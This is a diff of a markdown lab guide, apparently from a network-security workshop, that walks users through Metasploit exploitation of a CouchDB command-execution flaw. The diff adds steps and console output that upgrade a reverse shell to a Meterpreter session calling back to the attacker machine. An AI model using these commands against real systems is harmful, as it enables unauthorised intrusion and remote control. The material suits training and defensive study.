@@ -504,7 +504,6 @@ meterpreter > ?
 ```
   * Type **ls** to see files on the filesystem
   * Type **download** and specify any of the files you discoverd above to download those to your local machine
-  * Type **shell** to drop into a system command shell
 
 > **Note**: Do not fatally damage the exploited VM at this point, as we will be using it again in other exercises. Do not close the Meterpreter session as we will use this existing session to move our attack in the next exercise.
 
@@ -577,7 +576,7 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
     * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**. (check the NSX VM Inventory to confirm)+
     * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
-    * Type **set LPORT 4445** to define the local port to use. The reverse 
+    * Type **set LPORT 4445** to define the local port to use. The reverse shell will be established to this local port
     * Type **exploit** to initiate the exploit and esbalish a command shell
 ```console
 msf5 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/linux/http/apache_couchdb_cmd_exec
@@ -604,6 +603,30 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 [+] Deleted /tmp/okmyzfondlujy
 [*] Server stopped.
 ```
+3. You can now interact with the shell session or upgrade to a more powerful Meterpreter session. In order to upgrade to Meterpreter, you can run the below commands 
+    * Type **use multi/manage/shell_to_meterpreter** to select the CouchDB Command Execution exploit module
+    * Type **set LPORT 8081** to define the local port to use. The reverse shell will be established to this local port
+    * Type **set session 2** to indicate the reverse command shell session from **App1-WEB-APP VM** is the one we want to upgrade
+    * Type **exploit** to establish the session
+
+```console
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > use multi/manage/shell_to_meterpreter
+msf5 post(multi/manage/shell_to_meterpreter) > set LPORT 8081
+LPORT => 8081
+msf5 post(multi/manage/shell_to_meterpreter) > set session 2
+session => 2
+msf5 post(multi/manage/shell_to_meterpreter) > exploit
+```
+4. Confirm a **Meterpreter** reverse TCP session was established from **App1-APP-TIER VM** back to the **Extermal VM** and interact with the session.
+```console
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.114.209.151:8081
+[*] Sending stage (980808 bytes) to 10.114.209.148
+[*] Meterpreter session 3 opened (10.114.209.151:8081 -> 10.114.209.148:59526) at 2020-07-22 09:42:42 -0500
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+```
 6. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
     * Type **sysinfo** to learn more about the running OS
 
@@ -613,8 +636,6 @@ Computer    : 273e1700c5be
 OS          : Linux 273e1700c5be 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
 Meterpreter : php/linux
 meterpreter > ?
-```
-
 
 
 
